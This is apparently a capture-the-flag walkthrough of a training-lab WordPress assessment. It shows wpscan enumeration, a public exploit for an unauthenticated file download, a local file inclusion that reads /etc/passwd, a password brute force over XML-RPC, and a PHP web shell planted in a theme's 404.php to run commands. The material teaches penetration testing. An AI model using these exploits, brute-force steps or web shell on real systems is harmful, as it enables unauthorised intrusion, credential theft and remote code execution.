We have reached the end of the module!

Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.

---

## Scenario

You have been contracted to perform an external penetration test against the company`INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.

Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.

Note: You need to have a knowledge about how in Linux DNS mapping is done when the name server is missing.

# Questions
---

![Pasted image 20250220140318.png](../../../IMAGES/Pasted%20image%2020250220140318.png)
### Initial Enumeration
---

Let's begin by checking the website:


![Pasted image 20250220140634.png](../../../IMAGES/Pasted%20image%2020250220140634.png)

We got `Home`, `About Us`, `Services`, `Dropdown`, `Contact` and `Blog`, all seems normal, this main site is not running on WordPress so we cannot enumerate it yet, if we go to blog, we can see this:

![Pasted image 20250220140811.png](../../../IMAGES/Pasted%20image%2020250220140811.png)

So, we need to add `blog.inlanefreight.local` to `/etc/hosts`, let's do it:

```
echo 'IP blog.inlanefreight.local' | sudo tee -a /etc/hosts
```

If we check this site now, we can see this:

![Pasted image 20250220140954.png](../../../IMAGES/Pasted%20image%2020250220140954.png)

We can check the technologies the site is using with `wappalyzer`:

![Pasted image 20250220141020.png](../../../IMAGES/Pasted%20image%2020250220141020.png)

There we go, it is using WordPress `5.1.6`, let's use `wpscan` for the initial enumeration:

```
wpscan --url "http://blog.inlanefreight.local" --enumerate -t 50
```

We get this output:

```
[+] Headers
 | Interesting Entries:
 | - Server: Apache/2.4.29 (Ubuntu)
 | - X-TEC-API-VERSION: v1
 | - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
 | - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 | - http://codex.wordpress.org/XML-RPC_Pingback_API
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 | - https://www.iplocation.net/defend-wordpress-from-ddos
 | - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 | - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:16 <=======================> (652 / 652) 100.00% Time: 00:00:16
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:08 <=====================> (2575 / 2575) 100.00% Time: 00:01:08

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <========================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <==============================> (84 / 84) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:03 <===================> (100 / 100) 100.00% Time: 00:00:03

[i] Medias(s) Identified:

[+] http://blog.inlanefreight.local/?attachment_id=13
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=11
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=14
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://blog.inlanefreight.local/?attachment_id=15
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=========================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erika
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 | Rss Generator (Passive Detection)
 | Author Id Brute Forcing - Display Name (Aggressive Detection)
 | Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 | Rss Generator (Passive Detection)
 | Author Id Brute Forcing - Display Name (Aggressive Detection)
 | Login Error Messages (Aggressive Detection)

[+] Charlie Wiggins
 | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
```

A lot of valuable information:

```ad-important
1. Theme is: `twentynineteen`
2. Version is `5.1.6`
3. Only non admin user is: `Charlie Wiggins`
```

Now, let's proceed with the plugin enumeration:

```
wpscan --url "http://blog.inlanefreight.local" --enumerate ap -t 50 
```

We get this:

```
[+] Headers
 | Interesting Entries:
 | - Server: Apache/2.4.29 (Ubuntu)
 | - X-TEC-API-VERSION: v1
 | - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
 | - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 | - http://codex.wordpress.org/XML-RPC_Pingback_API
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.inlanefreight.local/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 | - https://www.iplocation.net/defend-wordpress-from-ddos
 | - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 | - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2025-02-19T08:44:00.000Z
 | [!] The version is out of date, the latest version is 5.7.52
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt

[+] site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt

[+] the-events-calendar
 | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
 | Last Updated: 2025-02-12T17:38:00.000Z
 | [!] The version is out of date, the latest version is 6.10.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.1.2.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
```

Now, if we go to:

```
/wp-content/uploads
```

We can see the following:

![Pasted image 20250220142528.png](../../../IMAGES/Pasted%20image%2020250220142528.png)

We found the first flag:

![Pasted image 20250220142544.png](../../../IMAGES/Pasted%20image%2020250220142544.png)

First flag is:

```
HTB{d1sabl3_d1r3ct0ry_l1st1ng!}
```

### Unauthenticated File Download
----


Now, in order to download the file using the vulnerable plugin, we need to analyze all the plugins we're currently dealing with:

```
[+] email-subscribers
 | Location: http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/
 | Last Updated: 2025-02-19T08:44:00.000Z
 | [!] The version is out of date, the latest version is 5.7.52
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt

[+] site-editor
 | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt

[+] the-events-calendar
 | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
 | Last Updated: 2025-02-12T17:38:00.000Z
 | [!] The version is out of date, the latest version is 6.10.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.1.2.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
```

We have 3 plugins:

```ad-info
1. email-subscribers 4.2.2
2. site-editor 1.1.1
3. the-events-calendar 5.1.2.1
```

We can begin by checking each one of them using the versions to check if there's any vulnerability regarding the version:

![Pasted image 20250220142950.png](../../../IMAGES/Pasted%20image%2020250220142950.png)

Found the one we need, it is a `email-subscribers 4.2.2 Unauthenticated File Download` Exploit, here's the PoC:

```
# Exploit Title: WordPress Plugin Email Subscribers & Newsletters 4.2.2 - Unauthenticated File Download
# Google Dork: "Stable tag" inurl:wp-content/plugins/email-subscribers/readme.txt
# Date: 2020-07-20
# Exploit Author: KBA@SOGETI_ESEC
# Vendor Homepage: https://www.icegram.com/email-subscribers/
# Software Link: https://pluginarchive.com/wordpress/email-subscribers/v/4-2-2
# Version: <= 4.2.2
# Tested on: Email Subscribers & Newsletters 4.2.2
# CVE : CVE-2019-19985


curl [BASE_URL]'/wp-admin/admin.php?page=download_report&report=users&status=all'
EXAMPLE: curl 'http://127.0.0.1/wp-admin/admin.php?page=download_report&report=users&status=all'
```

So, we need to use curl in the following way:

```bash
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'
```

We get this output:

```
curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'

"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"

```

Got the flag:

```
HTB{unauTh_d0wn10ad!}
```

### Checking for LFI vulnerable plugin 

If we now search for:

```
site-editor 1.1.1 exploit
```

We get this:

![Pasted image 20250220143320.png](../../../IMAGES/Pasted%20image%2020250220143320.png)

Which means, we got our vulnerable plugin and its version:

```
1.1.1
```

### Exploiting the LFI
---

Now, let's use the lfi:

```
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHPâ€™s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
 require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

--
Best Regards,

Nicolas Buzy-Debat
Orange Cyberdefense Singapore (CERT-LEXSI)
```

So, in order to read `/etc/passwd`, we need to use curl in this way:

```
curl http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

And we get this output:

```
curl http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
erika:x:1001:1001::/home/erika:/bin/bash
frank.mclane:x:1002:1002::/home/frank.mclane:/bin/bash
pollinate:x:103:1::/var/cache/pollinate:/bin/false
landscape:x:112:105::/var/lib/landscape:/usr/sbin/nologin
```

Answer is:

```
frank.mclane
```

### Getting RCE
---

Now, our next step would be getting RCE, for this, we need some credentials, let's try brute forcing `erika`'s password:


```
wpscan --password-attack xmlrpc -t 50 -U erika -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

We get the following:

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - erika / 010203 
Trying erika / kitkat Time: 00:00:20 < > (700 / 14345092) 0.00% ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: erika, Password: 010203

```

Got our credentials:

```
`erika`:`010203`
```

Now, let's log in:

![Pasted image 20250220144626.png](../../../IMAGES/Pasted%20image%2020250220144626.png)

Now we're in the admin panel, let's change the theme to a web shell:

![Pasted image 20250220144824.png](../../../IMAGES/Pasted%20image%2020250220144824.png)

Let's change the contents of `404.php` to:

```php
<?php

system($_GET['cmd']);
```


![Pasted image 20250220144836.png](../../../IMAGES/Pasted%20image%2020250220144836.png)

Nice, now we need to use curl to check if the webshell works:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

We get this:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

It works, let's read `/home/erika` directory:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls+/home/erika"

d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
```

Found our flag, let's read it:

```
curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat+/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"

HTB{w0rdPr355_4SS3ssm3n7}
```

Our final flag is:

```
HTB{w0rdPr355_4SS3ssm3n7}
```


![Pasted image 20250220145253.png](../../../IMAGES/Pasted%20image%2020250220145253.png)

